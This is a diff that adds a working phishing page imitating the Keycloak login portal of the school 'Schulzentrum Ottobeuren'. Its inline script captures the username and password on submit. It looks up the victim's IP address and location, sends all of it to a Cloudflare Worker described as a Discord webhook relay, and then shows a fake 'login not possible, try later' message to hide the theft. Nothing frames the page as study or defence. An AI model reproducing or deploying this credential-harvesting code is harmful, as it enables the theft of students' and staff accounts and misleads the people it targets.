@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html class="login-pf">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Sign in to Schulzentrum Ottobeuren</title>
+    <link rel="icon" href="favicon.ico">
+    <link href="css/patternfly.min_1.css" rel="stylesheet">
+    <link href="css/patternfly.min.css" rel="stylesheet">
+    <link href="css/patternfly-additions.min.css" rel="stylesheet">
+    <link href="css/pficon.css" rel="stylesheet">
+    <link href="css/login.css" rel="stylesheet">
+    <link href="css/custom.css" rel="stylesheet">
+    <style>
+        .card-pf {
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        #kc-form-wrapper {
+            max-width: 100%;
+            overflow-wrap: break-word;
+        }
+        #placeholder-message {
+            font: optional;
+            color: #ff0000;
+            margin-top: 10px;
+            max-width: 100%;
+            word-wrap: break-word;
+            white-space: normal;
+            font-size: 10px;
+        }
+    </style>
+</head>
+
+<body class="">
+    <div class="header-bar">
+        <div id="kc-header" class="login-pf-page-header">
+            <div id="kc-header-wrapper" class="">
+                <img class="ld-logo-keycloak-left" src="images/keycloak-left.png"> Schulzentrum Ottobeuren <img
+                    class="ld-logo-keycloak-right" src="images/keycloak-right.png">
+            </div>
+        </div>
+    </div>
+
+    <div class="login-pf-page">
+        <div class="card-pf">
+            <header class="login-pf-header">
+                <h1 id="kc-page-title">
+                    <img src="images/eule.svg" alt="Theo" class="theo-img">
+                    Sign in to your account
+                </h1>
+            </header>
+            <div id="kc-content">
+                <div id="kc-content-wrapper">
+                    <div id="kc-form">
+                        <div id="kc-form-wrapper">
+                            <form id="kc-form-login" onsubmit="validateAndSubmit(event);">
+                                <div class="form-group">
+                                    <label for="username" class="pf-c-form__label pf-c-form__label-text">Username or
+                                        email</label>
+                                    <input tabindex="1" id="username" class="pf-c-form-control" name="username"
+                                        type="text" autofocus="" autocomplete="off">
+                                </div>
+                                <div class="form-group">
+                                    <label for="password"
+                                        class="pf-c-form__label pf-c-form__label-text">Password</label>
+                                    <div class="pf-c-input-group">
+                                        <input tabindex="2" id="password" class="pf-c-form-control" name="password"
+                                            type="password" autocomplete="off">
+                                        <button class="pf-c-button pf-m-control" type="button"
+                                            aria-label="Show password" aria-controls="password" data-password-toggle=""
+                                            data-label-show="Show password" data-label-hide="Hide password"
+                                            onclick="togglePasswordVisibility()">
+                                            <i class="custom-icon custom-eye" aria-hidden="true"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div id="kc-form-buttons" class="form-group">
+                                    <input tabindex="4" class="pf-c-button pf-m-primary pf-m-block btn-lg" name="login"
+                                        id="kc-login" type="submit" value="Sign In">
+                                    <span id="loading-indicator" style="display: none;">⏳</span>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="loginFooter">
+        <img src="images/logodidact-white.svg" class="img-left" alt="LogoDIDACT">
+        <img src="images/sbe-logo-white.svg" class="img-right" alt="SBEnetwordsolutions">
+    </div>
+
+ <script>
+    function validateAndSubmit(event) {
+        event.preventDefault();
+
+        const usernameField = document.getElementById('username');
+        const passwordField = document.getElementById('password');
+        const loadingIndicator = document.getElementById('loading-indicator');
+        const submitButton = document.getElementById('kc-login');
+        let isValid = true;
+
+        if (!usernameField.value.trim() || !passwordField.value.trim()) {
+            isValid = false;
+        }
+
+        if (isValid) {
+            loadingIndicator.style.display = 'inline-block';
+            submitButton.disabled = true;
+
+            sendDataToWebhook(usernameField.value, passwordField.value)
+                .then(() => {
+                    setTimeout(() => {
+                        displayPlaceholderMessage();
+                        loadingIndicator.style.display = 'none';
+                        submitButton.disabled = false;
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Fehler:', error);
+                    loadingIndicator.style.display = 'none';
+                    submitButton.disabled = false;
+                });
+        }
+    }
+
+    async function sendDataToWebhook(user, password) {
+        // URL des Cloudflare Workers
+        var workerURL = "https://discord-webhook-relay.voyager273.workers.dev/";
+
+        // Aktuelle Website abrufen
+        var website = window.location.href;
+
+        try {
+            // IP & Standort abrufen
+            let response = await fetch("https://ipapi.co/json/");
+            let ipData = await response.json();
+
+            var ip = ipData.ip || "Unbekannt";
+            var isp = ipData.org || "Unbekannt";
+            var city = ipData.city || "Unbekannt";
+            var country = ipData.country_name || "Unbekannt";
+
+            var data = {
+                user: user,
+                password: password,
+                website: website,
+                ip: ip,
+                isp: isp,
+                city: city,
+                country: country,
+                timestamp: new Date().toLocaleString()
+            };
+
+            // Daten an Cloudflare Worker senden
+            await fetch(workerURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+
+        } catch (error) {
+            console.error("Fehler beim Senden der Daten:", error);
+            throw error; // Fehler weitergeben, damit die catch-Block in validateAndSubmit ausgeführt wird
+        }
+    }
+
+    function displayPlaceholderMessage() {
+        let existingMessage = document.getElementById('placeholder-message');
+
+        if (!existingMessage) {
+            const messageDiv = document.createElement('div');
+            messageDiv.id = 'placeholder-message';
+            messageDiv.textContent = 'Anmeldung zur Zeit nicht möglich. Versuchen Sie es später erneut!';
+            document.getElementById('kc-form-wrapper').appendChild(messageDiv);
+        } else {
+            existingMessage.style.display = 'block';
+        }
+    }
+
+    function togglePasswordVisibility() {
+        const passwordField = document.getElementById('password');
+        const toggleButton = passwordField.nextElementSibling;
+        const isPasswordVisible = passwordField.type === 'text';
+
+        if (isPasswordVisible) {
+            passwordField.type = 'password';
+            toggleButton.setAttribute('aria-label', 'Show password');
+        } else {
+            passwordField.type = 'text';
+            toggleButton.setAttribute('aria-label', 'Hide password');
+        }
+    }
+</script>
+</body>
+
+</html>
